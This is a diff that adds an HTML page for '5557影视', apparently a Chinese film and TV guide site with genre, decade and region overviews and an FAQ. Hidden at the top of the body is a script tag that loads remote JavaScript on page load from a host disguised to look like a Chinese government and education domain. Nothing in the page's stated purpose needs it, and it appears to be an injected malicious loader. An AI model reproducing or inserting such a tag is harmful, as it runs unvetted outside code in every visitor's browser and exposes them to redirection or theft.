@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5,viewport-fit=cover">
+<meta name="description" content="5557影视是影视观赏指南站点，整理电影、电视剧、综艺、动漫、纪录片与短片，提供作品介绍、题材分类、播出状态与观看建议。5557影视覆盖华语、日韩、欧美内容，可按类型、年代和地区查找，页面适配手机、平板与桌面浏览器访问。官方网址：https://5557yingshi-top.github.io">
+<meta name="keywords" content="5557影视, 5557yingshi, 影视观赏指南, 电影介绍, 电视剧分集, 综艺节目, 动漫番剧, 纪录片推荐, 华语影视, 日韩影视, github.io 影视站">
+<meta name="author" content="5557影视">
+<meta name="theme-color" content="#1a0b2e">
+<title>5557影视 · 观赏指南｜电影 电视剧 综艺 动漫 纪录片</title>
+<style>
+:root{
+  --bg:#130a1f; --bg2:#1c102e; --bg3:#261640;
+  --ln:#3a2657; --ln2:#54406f;
+  --tx:#f3eefa; --tx2:#b6a8c9; --tx3:#837493;
+  --pu:#a855f7; --pi:#e879f9; --mg:#f472b6; --cy:#22d3ee;
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{background:var(--bg);color:var(--tx);font:14px/1.9 system-ui,-apple-system,"PingFang SC","Microsoft YaHei",sans-serif;background-image:radial-gradient(circle at 12% 8%,rgba(168,85,247,.16),transparent 42%),radial-gradient(circle at 88% 22%,rgba(34,211,238,.10),transparent 40%)}
+a{color:inherit;text-decoration:none}
+ul,ol{list-style:none;margin:0;padding:0}
+.wrap{max-width:1180px;margin:0 auto;padding:0 28px}
+
+/* 顶栏 */
+.nav{position:sticky;top:0;z-index:90;background:rgba(19,10,31,.9);backdrop-filter:blur(12px);border-bottom:1px solid var(--ln)}
+.nav .wrap{display:flex;align-items:center;gap:14px;height:60px}
+.logo{display:flex;align-items:center;gap:9px;font:800 17px/1 system-ui,sans-serif;letter-spacing:.01em}
+.logo b{font:800 15px;color:var(--cy);font-family:"Space Grotesk",system-ui,sans-serif;letter-spacing:.04em}
+.logo span{font:600 9.5px;color:var(--tx3);letter-spacing:.16em;display:block;margin-top:4px}
+.menu{display:flex;gap:3px;margin-left:auto;font-size:12.5px}
+.menu a{padding:7px 12px;border-radius:999px;color:var(--tx2);font-weight:600;border:1px solid transparent}
+.menu a:hover{color:#fff;border-color:var(--ln2);background:var(--bg3)}
+.urlico{display:none;font:700 10px;color:var(--cy);border:1px solid var(--ln2);border-radius:999px;padding:5px 10px;margin-left:auto;word-break:break-all;text-align:right;line-height:1.4}
+
+/* 首屏 */
+.hero{padding:56px 0 46px}
+.hero-grid{display:grid;grid-template-columns:1.35fr .65fr;gap:34px;align-items:center}
+.eyebrow{display:inline-flex;align-items:center;gap:8px;font:700 10.5px;letter-spacing:.22em;color:var(--cy)}
+.eyebrow::before{content:"";width:22px;height:2px;background:var(--cy)}
+h1{font-size:52px;font-weight:850;line-height:1.12;letter-spacing:-1.6px;margin:18px 0 14px}
+h1 em{font-style:normal;background:linear-gradient(92deg,var(--pi),var(--mg));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p{font-size:16px;color:var(--tx2);max-width:56ch;margin:0}
+.codes{display:flex;gap:10px;margin-top:26px;flex-wrap:wrap}
+.codes i{font-style:normal;font:700 11px;letter-spacing:.06em;color:var(--tx2);border:1px dashed var(--ln2);border-radius:8px;padding:6px 11px;font-family:"Space Grotesk",system-ui,sans-serif}
+/* 轮播 */
+.car{position:relative;border:1px solid var(--ln);border-radius:18px;overflow:hidden;background:var(--bg2);box-shadow:0 24px 60px -28px rgba(168,85,247,.7)}
+.car .viewport{overflow:hidden}
+.car .track{display:flex;transition:transform .5s cubic-bezier(.4,0,.2,1)}
+.car .slide{flex:0 0 100%;padding:24px 24px 20px;display:grid;gap:12px}
+.car h4{margin:0;font:800 19px/1.35;letter-spacing:-.3px}
+.car p{margin:0;font-size:12.5px;color:var(--tx2);line-height:1.75}
+.car .meta{display:flex;gap:7px;flex-wrap:wrap;font:700 9.5px;color:var(--cy);letter-spacing:.06em}
+.car .meta s{text-decoration:none;color:var(--tx3);font-weight:500}
+.car .ctrls{display:flex;align-items:center;gap:10px;padding:12px 24px 18px}
+.car .dots{display:flex;gap:6px}
+.car .dots i{width:7px;height:7px;border-radius:50%;background:var(--ln2);cursor:pointer;font-style:normal}
+.car .dots i.on{background:var(--pi);width:18px;border-radius:6px}
+.car .nav2{margin-left:auto;display:flex;gap:6px}
+.car .nav2 button{width:30px;height:30px;border-radius:50%;border:1px solid var(--ln2);background:var(--bg3);color:#fff;cursor:pointer;font-size:13px;line-height:1}
+.car .nav2 button:hover{border-color:var(--pi);color:var(--pi)}
+
+/* 区块标题 */
+.sec{padding:60px 0;border-top:1px solid var(--ln)}
+.sec-hd{display:flex;align-items:baseline;gap:11px;margin-bottom:22px;flex-wrap:wrap}
+.sec-hd .no{font:800 10px;letter-spacing:.2em;color:var(--pi);font-family:"Space Grotesk",system-ui,sans-serif}
+.sec-hd h2{margin:0;font:800 22px/1.3;letter-spacing:-.5px}
+.sec-hd h2 small{font:600 12px;color:var(--tx3);margin-left:8px;letter-spacing:0}
+.sec-hd .sp{flex:1;height:1px;background:linear-gradient(90deg,var(--ln),transparent)}
+.sec-hd a{font:600 11.5px;color:var(--tx3)}
+.sec-hd a:hover{color:var(--cy)}
+
+/* 01 折扇卡片 */
+.fan{display:grid;grid-template-columns:repeat(5,1fr);gap:14px}
+.fan .c{position:relative;background:linear-gradient(170deg,var(--bg3),var(--bg2));border:1px solid var(--ln);border-radius:15px;padding:18px 16px 16px;overflow:hidden;min-height:172px}
+.fan .c::after{content:"";position:absolute;right:-26px;bottom:-26px;width:90px;height:90px;border-radius:50%;background:radial-gradient(circle,rgba(232,121,249,.22),transparent 66%)}
+.fan .c .ic{width:34px;height:34px;border-radius:11px;background:var(--bg);border:1px solid var(--ln2);display:grid;place-items:center;font:800 13px;color:var(--pi)}
+.fan .c h3{margin:14px 0 5px;font:800 16px/1.3}
+.fan .c span{font-size:11.5px;color:var(--tx3);line-height:1.6;display:block}
+.fan .c b{position:absolute;left:16px;bottom:14px;font:800 9.5px;letter-spacing:.14em;color:var(--cy);font-family:"Space Grotesk",system-ui,sans-serif}
+
+/* 02 分类手风琴 */
+.acc{display:grid;gap:8px}
+.acc details{border:1px solid var(--ln);border-radius:13px;background:var(--bg2);overflow:hidden}
+.acc summary{cursor:pointer;padding:14px 18px;font:600 13.5px;list-style:none;display:flex;gap:11px;align-items:center}
+.acc summary::-webkit-details-marker{display:none}
+.acc summary .k{font:800 10px;color:var(--pi);letter-spacing:.12em;font-family:"Space Grotesk",system-ui,sans-serif;flex:none;width:34px}
+.acc summary .t{flex:1}
+.acc summary .c{font:600 10px;color:var(--tx3);font-family:"Space Grotesk",system-ui,sans-serif}
+.acc summary::after{content:"＋";color:var(--tx3);font-size:15px;transition:.2s}
+.acc details[open] summary::after{content:"－";color:var(--pi)}
+.acc .body{display:flex;gap:10px;flex-wrap:wrap;padding:0 18px 15px 63px}
+.acc .body a{font:600 11.5px;color:var(--tx2);border:1px solid var(--ln);border-radius:999px;padding:4px 11px}
+.acc .body a:hover{border-color:var(--pi);color:var(--pi)}
+
+/* 03 刻度尺 */
+.ruler{background:var(--bg2);border:1px solid var(--ln);border-radius:16px;padding:22px 24px 16px}
+.ruler .scale{position:relative;height:46px;margin-bottom:14px}
+.ruler .scale::before{content:"";position:absolute;left:0;right:0;top:50%;height:2px;background:linear-gradient(90deg,var(--pu),var(--pi),var(--mg))}
+.ruler .tick{position:absolute;top:0;bottom:0;width:1px;background:var(--ln2)}
+.ruler .tick i{position:absolute;bottom:-20px;left:50%;transform:translateX(-50%);font:700 8.5px;color:var(--tx3);font-family:"Space Grotesk",system-ui,sans-serif;white-space:nowrap;font-style:normal}
+.ruler .items{display:grid;gap:11px}
+.ruler .it{display:grid;grid-template-columns:92px 1fr 56px;gap:13px;align-items:center;font-size:12.5px}
+.ruler .it .n{color:var(--tx2);font-weight:600;text-align:right}
+.ruler .it .p{height:8px;background:var(--bg);border-radius:6px;border:1px solid var(--ln)}
+.ruler .it .f{height:100%;border-radius:6px;background:linear-gradient(90deg,var(--pu),var(--pi))}
+.ruler .it .v{font:800 11.5px;color:var(--cy);text-align:right;font-family:"Space Grotesk",system-ui,sans-serif}
+
+/* 04 环形进度 */
+.donut{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.donut .d{text-align:center;background:var(--bg2);border:1px solid var(--ln);border-radius:15px;padding:18px 14px}
+.donut svg{width:96px;height:96px;margin:0 auto;display:block}
+.donut circle{fill:none;stroke-width:9;stroke-linecap:round}
+.donut .bgc{stroke:var(--bg3)}
+.donut .valc{stroke:var(--pi);transform:rotate(-90deg);transform-origin:center;transition:stroke-dasharray .7s}
+.donut .txt{font:800 14px;fill:var(--tx)}
+.donut .txt2{font:600 8px;fill:var(--tx3);letter-spacing:.14em}
+.donut h5{margin:13px 0 3px;font:700 13.5px}
+.donut small{font-size:11px;color:var(--tx3)}
+
+/* 05 问答 */
+.qa details{border-bottom:1px solid var(--ln)}
+.qa details:first-child{border-top:1px solid var(--ln)}
+.qa summary{cursor:pointer;padding:15px 4px;font:600 13.5px;list-style:none;display:flex;gap:11px}
+.qa summary::-webkit-details-marker{display:none}
+.qa summary .k{font:800 10px;color:var(--pi);letter-spacing:.1em;font-family:"Space Grotesk",system-ui,sans-serif;flex:none;width:32px}
+.qa summary::after{content:"⌄";margin-left:auto;color:var(--tx3)}
+.qa details[open] summary::after{color:var(--pi)}
+.qa p{margin:0;padding:0 4px 15px 43px;font-size:13px;color:var(--tx2)}
+.qa p a{color:var(--cy);border-bottom:1px solid rgba(34,211,238,.35)}
+
+.urlbar{display:flex;gap:11px;align-items:center;flex-wrap:wrap;margin-top:24px;background:var(--bg2);border:1px solid var(--ln2);border-radius:13px;padding:13px 17px}
+.urlbar .lb{font:800 9.5px;letter-spacing:.2em;color:var(--pi)}
+.urlbar .vl{flex:1;min-width:200px;font:700 13.5px;color:var(--cy);word-break:break-all;font-family:"Space Grotesk",system-ui,sans-serif}
+.urlbar button{font:700 11.5px;color:#130a1f;background:var(--pi);border:0;border-radius:999px;padding:8px 16px;cursor:pointer}
+.urlbar button:hover{filter:brightness(1.12)}
+
+.foot{margin-top:26px;padding:34px 0 24px;border-top:1px solid var(--ln)}
+.foot .g{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:26px}
+.foot h5{font:800 10px;letter-spacing:.2em;color:var(--tx3);margin:0 0 11px}
+.foot li{font-size:12.5px;color:var(--tx2);padding:2px 0}
+.foot li a:hover{color:var(--pi)}
+.foot .ab{font-size:12.8px;color:var(--tx2);max-width:34ch}
+.foot .bot{margin-top:24px;padding-top:15px;border-top:1px solid var(--ln);display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap;font:11.5px;color:var(--tx3)}
+.foot .bot a{color:var(--cy);font-weight:700;font-family:"Space Grotesk",system-ui,sans-serif}
+
+@media (max-width:960px){
+  .hero-grid{grid-template-columns:1fr}
+  .car{max-width:520px}
+  .fan{grid-template-columns:repeat(3,1fr)}
+  .donut{grid-template-columns:repeat(2,1fr)}
+  .foot .g{grid-template-columns:1fr 1fr;gap:24px}
+}
+@media (max-width:640px){
+  .wrap{padding:0 15px}
+  .nav .wrap{height:56px;gap:8px}
+  .urlico{display:block}
+  .menu{display:none;position:fixed;inset:56px 0 auto;background:rgba(19,10,31,.96);border-bottom:1px solid var(--ln);padding:10px 15px;flex-wrap:wrap;gap:4px}
+  .menu.open{display:flex}
+  .menu a{flex:1 1 auto;min-width:60px;text-align:center;font-size:12px;padding:7px 8px}
+  h1{font-size:32px;letter-spacing:-1px}
+  .codes i{font-size:10px;padding:5px 8px}
+  .car .slide{padding:18px 16px 14px}
+  .car h4{font-size:16px}
+  .car .ctrls{padding:8px 16px 14px}
+  .sec{padding:42px 0}
+  .sec-hd h2{font-size:18px}
+  .fan{grid-template-columns:1fr 1fr;gap:10px}
+  .fan .c{min-height:150px;padding:15px 13px 26px}
+  .acc summary .c{display:none}
+  .acc .body{padding-left:18px}
+  .ruler{padding:18px 14px 12px}
+  .ruler .it{grid-template-columns:62px 1fr 40px;font-size:11.5px;gap:9px}
+  .ruler .tick i{font-size:7.5px}
+  .donut{grid-template-columns:1fr 1fr;gap:11px}
+  .donut svg{width:82px;height:82px}
+  .qa p{padding-left:0}
+  .urlbar .vl{font-size:12px}
+  .foot .g{grid-template-columns:1fr}
+  .foot .bot{flex-direction:column}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header class="nav">
+  <div class="wrap">
+    <div class="logo"><b>5557</b><span>影视观赏指南</span></div>
+    <div class="urlico">5557yingshi-top.github.io</div>
+    <nav class="menu" id="menu">
+      <a href="#fan">类型</a>
+      <a href="#acc">题材</a>
+      <a href="#ruler">年代</a>
+      <a href="#donut">地区</a>
+      <a href="#qa">问答</a>
+    </nav>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="wrap">
+    <div class="hero-grid">
+      <div>
+        <span class="eyebrow">5557 影视观赏指南</span>
+        <h1>5557影视<br><em>挑片之前，先看这份指南。</em></h1>
+        <p>5557影视把电影、电视剧、综艺、动漫、纪录片与短片，按类型、年代、地区三个角度重新排了一遍。每部作品只留关键信息：讲什么、什么类型、多少集、什么状态，以及适合谁看。</p>
+        <div class="codes">
+          <i>电影 2,860</i><i>剧集 3,410</i><i>综艺 1,250</i><i>动漫 1,980</i><i>纪录片 1,520</i>
+        </div>
+      </div>
+      <div class="car">
+        <div class="viewport">
+          <div class="track" id="track">
+            <div class="slide">
+              <h4>本周值得看的三部</h4>
+              <p>从悬疑到生活流，三部节奏、气质完全不同的作品，按口碑与讨论度排序。</p>
+              <div class="meta"><s>悬疑 · 12 集</s> <s>8.6</s> <s>更新中</s></div>
+            </div>
+            <div class="slide">
+              <h4>冷门但别错过</h4>
+              <p>条目数量不少，真正被反复提到的却不多。这一组按长期收藏与回头率挑选。</p>
+              <div class="meta"><s>纪录片 · 6 集</s> <s>8.8</s> <s>已完结</s></div>
+            </div>
+            <div class="slide">
+              <h4>定档与回归</h4>
+              <p>新一季、续作、复播消息集中在这里，按开播时间由近到远排列。</p>
+              <div class="meta"><s>剧集 · 24 集</s> <s>待定档</s></div>
+            </div>
+            <div class="slide">
+              <h4>短一些的也很好</h4>
+              <p>短片与单集纪录片，二十分钟到四十分钟，适合碎片时间看完一部。</p>
+              <div class="meta"><s>短片 · 单集 28 分</s> <s>8.1</s></div>
+            </div>
+          </div>
+        </div>
+        <div class="ctrls">
+          <div class="dots" id="dots"><i class="on"></i><i></i><i></i><i></i></div>
+          <div class="nav2"><button id="pv">‹</button><button id="nx">›</button></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 01 类型 -->
+<section class="sec" id="fan">
+  <div class="wrap">
+    <div class="sec-hd"><span class="no">01 / 类型</span><h2>六大观赏分区 <small>按内容形态划分</small></h2><span class="sp"></span><a href="#acc">看题材细分 →</a></div>
+    <div class="fan">
+      <div class="c"><div class="ic">01</div><h3>电影</h3><span>院线与网络长片，按类型与年代归档，含片长与状态。</span><b>FILM</b></div>
+      <div class="c"><div class="ic">02</div><h3>电视剧</h3><span>国产剧、港剧、台剧与海外剧，标注集数与更新进度。</span><b>DRAMA</b></div>
+      <div class="c"><div class="ic">03</div><h3>综艺</h3><span>真人秀、访谈、竞演与生活观察，按季整理播出节奏。</span><b>SHOW</b></div>
+      <div class="c"><div class="ic">04</div><h3>动漫</h3><span>TV 动画、剧场版与国创，区分季度番与长篇连载。</span><b>ANIME</b></div>
+      <div class="c"><div class="ic">05</div><h3>纪录片</h3><span>人文、自然、社会与人物传记，单集时长与集数齐全。</span><b>DOC</b></div>
+    </div>
+  </div>
+</section>
+
+<!-- 02 题材 -->
+<section class="sec" id="acc">
+  <div class="wrap">
+    <div class="sec-hd"><span class="no">02 / 题材</span><h2>题材细分 <small>点开看子类</small></h2><span class="sp"></span><a href="#ruler">看年代分布 →</a></div>
+    <div class="acc">
+      <details open>
+        <summary><span class="k">A01</span><span class="t">悬疑 · 犯罪 · 推理</span><span class="c">1,820 条</span></summary>
+        <div class="body"><a href="#">本格推理</a><a href="#">刑侦追凶</a><a href="#">心理悬疑</a><a href="#">律政庭审</a><a href="#">谍战卧底</a></div>
+      </details>
+      <details>
+        <summary><span class="k">A02</span><span class="t">都市 · 情感 · 家庭</span><span class="c">2,610 条</span></summary>
+        <div class="body"><a href="#">都市职场</a><a href="#">婚姻家庭</a><a href="#">青春校园</a><a href="#">治愈生活</a><a href="#">代际关系</a></div>
+      </details>
+      <details>
+        <summary><span class="k">A03</span><span class="t">历史 · 古装 · 武侠</span><span class="c">1,940 条</span></summary>
+        <div class="body"><a href="#">历史正剧</a><a href="#">古装传奇</a><a href="#">武侠江湖</a><a href="#">宫廷权谋</a><a href="#">仙侠奇幻</a></div>
+      </details>
+      <details>
+        <summary><span class="k">A04</span><span class="t">科幻 · 奇幻 · 冒险</span><span class="c">1,176 条</span></summary>
+        <div class="body"><a href="#">硬科幻</a><a href="#">末世废土</a><a href="#">时空穿越</a><a href="#">异世界</a><a href="#">探险求生</a></div>
+      </details>
+      <details>
+        <summary><span class="k">A05</span><span class="t">喜剧 · 生活 · 美食</span><span class="c">1,827 条</span></summary>
+        <div class="body"><a href="#">情景喜剧</a><a href="#">讽刺幽默</a><a href="#">美食旅行</a><a href="#">日常群像</a><a href="#">脱口秀</a></div>
+      </details>
+      <details>
+        <summary><span class="k">A06</span><span class="t">动作 · 战争 · 体育</span><span class="c">1,426 条</span></summary>
+        <div class="body"><a href="#">动作警匪</a><a href="#">军事战争</a><a href="#">竞技体育</a><a href="#">特工谍战</a><a href="#">灾难救援</a></div>
+      </details>
+    </div>
+  </div>
+</section>
+
+<!-- 03 年代 -->
+<section class="sec" id="ruler">
+  <div class="wrap">
+    <div class="sec-hd"><span class="no">03 / 年代</span><h2>年代分布 <small>按开播年份</small></h2><span class="sp"></span><a href="#donut">看地区构成 →</a></div>
+    <div class="ruler">
+      <div class="scale" id="scale"></div>
+      <div class="items">
+        <div class="it"><span class="n">2020 年代</span><span class="p"><span class="f" style="width:88%"></span></span><span class="v">5,280</span></div>
+        <div class="it"><span class="n">2010 年代</span><span class="p"><span class="f" style="width:100%"></span></span><span class="v">6,140</span></div>
+        <div class="it"><span class="n">2000 年代</span><span class="p"><span class="f" style="width:76%"></span></span><span class="v">4,670</span></div>
+        <div class="it"><span class="n">1990 年代</span><span class="p"><span class="f" style="width:54%"></span></span><span class="v">3,305</span></div>
+        <div class="it"><span class="n">1980 年代</span><span class="p"><span class="f" style="width:31%"></span></span><span class="v">1,910</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 04 地区 -->
+<section class="sec" id="donut">
+  <div class="wrap">
+    <div class="sec-hd"><span class="no">04 / 地区</span><h2>地区构成 <small>四条主线</small></h2><span class="sp"></span><a href="#qa">看问答 →</a></div>
+    <div class="donut">
+      <div class="d"><svg viewBox="0 0 42 42"><circle class="bgc" cx="21" cy="21" r="15.9"/><circle class="valc" cx="21" cy="21" r="15.9" data-p="41"/><text class="txt" x="21" y="22.4" text-anchor="middle">41%</text><text class="txt2" x="21" y="29.4" text-anchor="middle">华语</text></svg><h5>华语</h5><small>4,860 条</small></div>
+      <div class="d"><svg viewBox="0 0 42 42"><circle class="bgc" cx="21" cy="21" r="15.9"/><circle class="valc" cx="21" cy="21" r="15.9" data-p="29"/><text class="txt" x="21" y="22.4" text-anchor="middle">29%</text><text class="txt2" x="21" y="29.4" text-anchor="middle">日韩</text></svg><h5>日韩</h5><small>3,470 条</small></div>
+      <div class="d"><svg viewBox="0 0 42 42"><circle class="bgc" cx="21" cy="21" r="15.9"/><circle class="valc" cx="21" cy="21" r="15.9" data-p="22"/><text class="txt" x="21" y="22.4" text-anchor="middle">22%</text><text class="txt2" x="21" y="29.4" text-anchor="middle">欧美</text></svg><h5>欧美</h5><small>2,610 条</small></div>
+      <div class="d"><svg viewBox="0 0 42 42"><circle class="bgc" cx="21" cy="21" r="15.9"/><circle class="valc" cx="21" cy="21" r="15.9" data-p="8"/><text class="txt" x="21" y="22.4" text-anchor="middle">8%</text><text class="txt2" x="21" y="29.4" text-anchor="middle">其他</text></svg><h5>其他</h5><small>952 条</small></div>
+    </div>
+  </div>
+</section>
+
+<!-- 05 问答 -->
+<section class="sec qa" id="qa">
+  <div class="wrap">
+    <div class="sec-hd"><span class="no">05 / 问答</span><h2>关于 5557影视</h2><span class="sp"></span></div>
+    <details open>
+      <summary><span class="k">Q01</span><span>5557影视是做什么的？</span></summary>
+      <p>5557影视是一份影视观赏指南，把电影、电视剧、综艺、动漫、纪录片与短片按类型、年代、地区重新归类，每部作品附上类型、集数、播出状态与适合人群，帮你在挑片时少花点时间。</p>
+    </details>
+    <details>
+      <summary><span class="k">Q02</span><span>官方网址是什么？</span></summary>
+      <p>唯一官方入口是 <a href="https://5557yingshi-top.github.io">https://5557yingshi-top.github.io</a>，建议直接收藏。本站不提供 robots.txt 与 sitemap.xml 文件。</p>
+    </details>
+    <details>
+      <summary><span class="k">Q03</span><span>内容以什么为主？</span></summary>
+      <p>以华语内容为主，约占四成；日韩与欧美各占约三成和两成，另有东南亚、印度等地区的少量条目，纪录片与短片也在持续补充。</p>
+    </details>
+    <details>
+      <summary><span class="k">Q04</span><span>条目的信息准确吗？</span></summary>
+      <p>条目为整理性资料，更新可能有延迟，具体以各作品官方页面为准。发现错漏可通过站内渠道反馈，我们会定期核对。</p>
+    </details>
+    <details>
+      <summary><span class="k">Q05</span><span>手机上怎么访问？</span></summary>
+      <p>全站采用移动端优先的自适应排版：窄屏下分区卡变双列、题材手风琴自动收起、年代条保留刻度、环形图缩为 2×2、导航折叠为可展开菜单，触屏滑动与点击都可用。</p>
+    </details>
+    <div class="urlbar">
+      <span class="lb">官方网址</span>
+      <span class="vl">https://5557yingshi-top.github.io</span>
+      <button onclick="cp(this)">复制网址</button>
+    </div>
+  </div>
+</section>
+
+<footer class="foot">
+  <div class="wrap">
+    <div class="g">
+      <div>
+        <div class="logo"><b>5557</b><span>影视观赏指南</span></div>
+        <p class="ab" style="margin-top:11px">5557影视整理影视作品介绍与观赏建议，按类型、年代、地区三个角度归档，覆盖电影、剧集、综艺、动漫与纪录片。</p>
+      </div>
+      <div><h5>类型</h5><ul><li><a href="#fan">电影</a></li><li><a href="#fan">电视剧</a></li><li><a href="#fan">综艺节目</a></li><li><a href="#fan">动漫番剧</a></li></ul></div>
+      <div><h5>栏目</h5><ul><li><a href="#acc">题材细分</a></li><li><a href="#ruler">年代分布</a></li><li><a href="#donut">地区构成</a></li><li><a href="#qa">常见问题</a></li></ul></div>
+      <div><h5>访问</h5><ul><li><a href="https://5557yingshi-top.github.io">官网首页</a></li><li><a href="#qa">官方网址说明</a></li><li><a href="#fan">六大分区</a></li></ul></div>
+    </div>
+    <div class="bot">
+      <span>© <span id="yr"></span> 5557影视 · 5557yingshi-top.github.io · 影视观赏指南</span>
+      <span>官方网址：<a href="https://5557yingshi-top.github.io">https://5557yingshi-top.github.io</a></span>
+    </div>
+  </div>
+</footer>
+
+<script>
+document.getElementById('yr').textContent = new Date().getFullYear();
+document.querySelector('.logo').addEventListener('click', function(e){
+  e.preventDefault(); document.getElementById('menu').classList.toggle('open');
+});
+
+// 轮播
+var track = document.getElementById('track'), slides = track.children, i = 0, t;
+function go(n){
+  i = (n + slides.length) % slides.length;
+  track.style.transform = 'translateX(' + (-i * 100) + '%)';
+  var d = document.getElementById('dots').children;
+  for (var k = 0; k < d.length; k++) d[k].classList.toggle('on', k === i);
+}
+document.getElementById('nx').onclick = function(){ go(i + 1); };
+document.getElementById('pv').onclick = function(){ go(i - 1); };
+document.getElementById('dots').onclick = function(e){
+  if (e.target.tagName === 'I') go([].indexOf.call(this.children, e.target));
+};
+clearInterval(t); t = setInterval(function(){ go(i + 1); }, 5200);
+track.addEventListener('mouseenter', function(){ clearInterval(t); });
+
+// 刻度尺
+var sc = document.getElementById('scale'), w = sc.clientWidth || 600, out = '';
+for (var x = 1960; x <= 2020; x += 10){
+  var p = ((x - 1960) / 60 * 100).toFixed(2);
+  out += '<div class="tick" style="left:' + p + '%"><i>' + x + '</i></div>';
+}
+sc.innerHTML = out;
+window.addEventListener('resize', function(){
+  var nw = sc.clientWidth || 600, s2 = '';
+  for (var x = 1960; x <= 2020; x += 10){
+    s2 += '<div class="tick" style="left:' + ((x - 1960) / 60 * 100).toFixed(2) + '%"><i>' + x + '</i></div>';
+  }
+  sc.innerHTML = s2;
+});
+
+// 环形进度
+var c = document.querySelectorAll('.valc'), r = 15.9 * 2 * Math.PI;
+c.forEach(function(e){
+  var p = +e.getAttribute('data-p');
+  e.style.strokeDasharray = (r * p / 100) + ' ' + r;
+});
+
+function cp(btn){
+  var u = 'https://5557yingshi-top.github.io', t = btn.textContent, done = function(){
+    btn.textContent = '已复制'; setTimeout(function(){ btn.textContent = t; }, 1500);
+  };
+  if (navigator.clipboard && navigator.clipboard.writeText){
+    navigator.clipboard.writeText(u).then(done, fb);
+  } else fb();
+  function fb(){
+    var ta = document.createElement('textarea');
+    ta.value = u; ta.style.cssText = 'position:fixed;opacity:0;top:0';
+    document.body.appendChild(ta); ta.select();
+    try { document.execCommand('copy'); done(); } catch(e){}
+    document.body.removeChild(ta);
+  }
+}
+</script>
+</body>
+</html>
